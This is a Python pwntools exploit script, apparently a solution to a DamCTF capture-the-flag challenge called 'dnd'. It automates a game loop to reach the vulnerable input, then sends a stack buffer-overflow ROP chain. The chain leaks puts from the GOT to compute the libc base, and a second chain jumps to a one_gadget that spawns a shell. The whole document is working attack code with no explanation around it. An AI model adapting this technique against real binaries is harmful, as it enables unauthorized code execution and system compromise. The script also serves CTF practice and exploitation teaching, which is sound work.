# 0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
# 0x000000000040201a : ret
# 0x0000000000402cfd : pop rbx ; pop r12 ; pop rbp ; ret

from pwn import *

libc = ELF("./libc.so.6")

EXE_FILENAME = "./dnd_patched"
exe = ELF(EXE_FILENAME)
context.binary = exe



#p = gdb.debug([EXE_FILENAME], gdbscript='''
#	b *win+243
#	''')

# p = remote("dnd.chals.damctf.xyz", 30813)
p = process(EXE_FILENAME)

def win():
	while True:
		p.sendline(b"a")
		res = p.recvuntil(b"? ")
		if b"fierce warrior?" in res:
			print(res.decode())
			break
		if b"You lost!" in res:
			print(":(")
			exit()

offset = 104
main = 0x0000000000402988
pop_rdi_rbp = 0x0000000000402640
ret = 0x000000000040201a
pop_rbx_r12_rbp = 0x0000000000402cfd
one_gadget = 0x583ec

p.recvuntil(b"? ")
win()

payload = flat(
	b"bin/sh\0/" * (offset//8),
	pop_rdi_rbp,
	exe.got.puts,
	0x0,
	exe.plt.puts,
	main
	)

p.sendline(payload)
p.recvline()
leak = p.recvline().replace(b"\n", b"")
leak = int.from_bytes(leak, "little")
libc_base = leak - libc.symbols.puts

print(f"Puts: {hex(leak)}")
print(f"Libc: {hex(libc_base)}")

p.recvuntil(b"? ")
win()

payload = flat(
	b"A" * offset,
	pop_rdi_rbp,
	0x408311,
	0x0,
	ret,
	exe.plt.strlen,
	pop_rbx_r12_rbp,
	0x0,
	0x0,
	0x0,
	libc_base + one_gadget,
	)

p.sendline(payload)

p.interactive()